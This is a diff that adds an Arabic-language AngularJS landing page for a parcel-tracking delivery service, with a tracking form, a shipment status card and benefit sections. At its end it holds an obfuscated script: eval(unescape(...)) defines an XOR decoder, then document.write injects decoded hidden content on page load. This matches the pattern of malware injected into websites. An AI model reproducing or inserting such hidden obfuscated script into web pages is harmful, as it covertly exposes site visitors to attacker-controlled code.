@@ -1,0 +1,244 @@
+<!DOCTYPE html lang="ar"  >
+<html ng-app="mainApp" >
+<head>
+<link href="https://www.latestblog.org/lab/demo/step-progressbar-css/css/progress-wizard.min.css" rel="stylesheet"  >
+<link href="https://fonts.googleapis.com/css?family=Cairo&display=black&style=black" rel="stylesheet">
+<link rel="stylesheet" href="style.css" >
+<meta http-equiv="content-type" content="text/html; charset=utf-8" >
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/bodymovin/5.5.3/lottie.min.js"></script>
+<title></title>
+</head>
+<body ng-controller="mainCtrl" > 
+          <!-------- navbar start ------>
+         <div ng-show="dataLoading" class="dataloading-container">
+          <div  id="preloading"></div>
+          </div>
+<div ng-class="{div: true, dataloaded: dataloaded}" class="dataloading"  >
+  <nav dir="rtl"  class="navbar">
+    <span class="navbar-toggle" id="js-navbar-toggle">
+            <i class="fas fa-bars"></i>
+        </span>
+    <img src="logo.png"  href="#" class="logo">
+    <ul class="main-nav" id="js-menu">
+      <li>
+        <a href="#" class="nav-links">الصفحة الرئيسية</a>
+      </li>
+      <li>
+        <a href="#" class="nav-links">عن ابو التوصيل</a>
+      </li>
+      <li>
+        <a href="#" class="nav-links">كن شريكنا</a>
+      </li>
+      <li>
+        <a href="#" class="nav-links">تتبع شحنة</a>
+      </li>
+      
+        <button href="#" class="send-order nav-links">ارسل شحنة</button>
+     
+    </ul>
+  </nav>
+            <!------- navbar end ---------->
+            <!------- main hero start ----->
+              <div class="main-hero">
+               <div class="card-container">
+                <div class="main-card" >
+                  <h1>
+                    تتبع شحناتك اون لاين
+                  </h1>
+                  <h4>
+                  بأسهل طريقة
+                  </h4>
+                  <p>
+                  تتبع جميع شحناتك عن طريق رقم الشحنة الخاص بالطلب، لمعرفة مكان الطلب و حالته ومعلومات جميع طلباتك 
+                  </p>
+                  <form ng-model="idForm"  name="idForm" ng-submit="getData(idForm.$valid, tracking)" novalidate>
+                    <input dir="ltr"  ng-class="{div: true, errorInput: errorInput, trueInput: trueInput}"  ng-required="true"  ng-minlength="7" ng-maxlength="20" name="tracking"   type="text" ng-model="tracking"  placeholder="ex: tawseel-12345" >
+                 
+                 <p ng-show="idForm.tracking.$error.minlength && !idForm.tracking.$pristine">Username is too short.</p>
+                 <p ng-show="idForm.tracking.$error.maxlength">Username is too long.</p>
+                 
+                 <div class="tracking-btn-container" >  <button class="tracking-btn" type="submit"  ng-disabled="idForm.$inValid" >تتبع</button></div>
+                    
+                  </form>
+                </div>
+               </div>
+              </div>
+              <!-----DATA---->
+              <section dir="rtl"  class="main-card second-card"  ng-show="trackingCard" >
+              <div id="preloading" ng-show="trackingDataLoader" ></div>
+           <div ng-show="trackingData"  >  
+              <div ng-show="apitotal > 0"   >
+              <div>
+              <h5>
+               تفاصيل الشحنة
+              </h5>
+              <h1>
+              {{ jsondata.id }}
+              </h1>
+              {{ jsondaata.status }}
+              <h3 ng-if="jsondata.status.length == 9">
+              {{ jsondata.deliveredtime }}
+              </h3>
+              <ul dir="ltr"  class="progress-indicator">
+              <li class="{{ jsondata.progress5 }}" > <span class="bubble"></span> تم التوصيل </li>
+              <li class="{{ jsondata.progress4 }}" > <span class="bubble"></span> في إنتظار الوصول </li>
+              <li class="{{ jsondata.progress3 }}" > <span class="bubble"></span> تم إستلام الطلب </li>
+              <li class="{{ jsondata.progress2 }}" > <span class="bubble"></span> تم ارسال السائق </li>
+              <li class="{{ jsondata.progress1 }}" > <span class="bubble"></span> تمت الموافقة </li>
+              </ul>
+             
+             <h5 class="mt10" >
+             تفاصيل السائق
+             </h5>
+             <h1>
+             {{ jsondata.drivername }}
+             </h1>
+             <a class="small"  href="tel:07819587468" > اتصل على السائق </a>
+               </div>
+            <h3 class="mt10" >
+            العنوان
+            </h3>
+            
+               <div class="address" >
+               <h2>
+               من
+               </h2>
+               <h5><span>
+               {{ jsondata.addressfrom }}
+               </span></h5>
+               </div>
+               <div class="address" >
+               <h2>
+               الى
+               </h2>
+               <h5><span>
+               {{ jsondata.addressto }}
+               </h5></span>
+               </div>
+            
+         <div ng-if="jsondata.status.length == 9" >
+           <h5 class="mt10" >
+           تفاصيل المستلم
+           </h5>
+           <input type="text" class="status-input" value="{{ jsondata.pickername }} {{ jsondata.pickernum }}"  readonly="readonly">
+         </div>
+               </div>
+               <div ng-show="apitotal == 0" >
+               <img src="error.png" height="30%"  width="40%" >
+                <h2>
+                رقم تتبع الشحنة اللذي ادخلته خطأ
+                </h2>
+               </div>
+               </div>
+              </section>
+              
+            <!------- main hero end ------->
+            
+            
+            <!------- benefits start ------>
+            <div class="benefits-content container" ng-show="mainContent" >
+            
+              <section class="benefits ">
+               <div class="benefits-h1">
+               <h1>
+                 الفوائد
+               </h1>
+               </div>
+               <div class="benefits-content">
+               <img src="reliable.png" >
+               <div class="benefits-content-text">
+               <h2>
+               
+                امآن سلامة البضاعة
+               </h2>
+               <p>
+                الحفاظ على جودة السحنات أحد أهدافنا الرئيسيه تطمن على شحناتك ويانة
+               </p>
+               </div>
+               </div>
+               <div class="benefits-content">
+               <img src="truck.png">
+               <div class="benefits-content-text">
+               <h2>
+                سرعة توصيل البضائع
+               </h2>
+               <p>
+                السرعة بالتوصيل شي أساسي ومهم وفر الكم ابو التوصيل طلباتكم خلال ٢٤ ساعة
+               </p>
+               </div>
+               </div>
+               <div class="benefits-content">
+               <img src="economy.png">
+               <div class="benefits-content-text">
+               <h2>
+                 أسعار اقتصادية
+               </h2>
+               <p>
+                 اسعار التوصيل كلش رخيصة وتوفر عليك كومة اذا جنت صاحب مشروع تجاري او فرد عادي
+               </p>
+               </div>
+               </div>
+               
+              </section>
+              </div>
+              
+              <div ng-if="dataLoading"  id="preloading"></div>
+            <!------- benefits end -------->
+            <div class="benefits-content container" ng-show="mainContent" >
+            
+            <section class="benefits">
+            <div class="benefits-h1">
+            <h1>
+            الفوائد
+            </h1>
+            </div>
+            <div class="benefits-content service1">
+            <img class="home--offer-img" src="track.png" >
+            <div class="benefits-content-text service-text">
+            <h2><span>
+            تتبع شحناتك
+            </span></h2>
+            <p>
+            هذا النص هو مثال لنص تجريبي يمكن استبداله بنص افضل منه ويحاكيه بالمعنى لتصبح معلومة مفيدة تستخدم اساليب التسويق 
+            </p>
+            </div>
+            </div>
+            <div class="benefits-content service2">
+            <img class="home--offer-img"  src="fast.png">
+            <div class="benefits-content-text service-text">
+            <h2><span>
+            سرعة توصيل البضائع
+          </span>  </h2>
+            <p>
+            هذا النص هو مثال لنص تجريبي يمكن استبداله بنص افضل منه ويحاكيه بالمعنى لتصبح معلومة مفيدة تستخدم اساليب التسويق 
+            </p>
+            </div>
+            </div>
+            <div class="benefits-content service3">
+            <img class="home--offer-img" src="empty.jpg">
+            <div class="benefits-content-text service-text">
+            <h2><span>
+            شحن مختلف البضائع
+            </span></h2>
+            <p>
+            هذا النص هو مثال لنص تجريبي يمكن استبداله بنص افضل منه ويحاكيه بالمعنى لتصبح معلومة مفيدة تستخدم اساليب التسويق 
+            </p>
+            </div>
+            </div>
+            
+            </section>
+            </div>
+              </div>
+            <h1 dir="rtl"  align="center" style="margin-top:150px;" >محتوى قادم هنا!</h1>
+         <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.7.8/angular.min.js"></script>
+          <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.7.8/angular-route.min.js"></script>
+     <script defer src="https://use.fontawesome.com/releases/v5.0.13/js/all.js" integrity="sha384-xymdQtn1n3lH2wcu0qhcdaOpQwyoarkgLVxC/wZ5q7h9gHtxICrpcaSUfygqZGOe"
+    crossorigin="anonymous"></script>
+    <script type="text/javascript">
+    
+    eval(unescape('%66%75%6e%63%74%69%6f%6e%20%6a%30%63%35%31%33%36%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%31%30%31%38%32%32%39%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%37%30%31%38%33%33%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%37%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+    eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%6a%30%63%35%31%33%36%28%27') + '%45%79%68%78%76%71%7d%20%7a%78%62%47%2a%72%6b%72%74%33%77%7c%2e%45%42%3e%79%69%7f%73%75%7a%43%45%30%6e%76%6a%88%4611018229%36%33%32%31%36%36%36' + unescape('%27%29%29%3b'));
+    </script>
+</html>
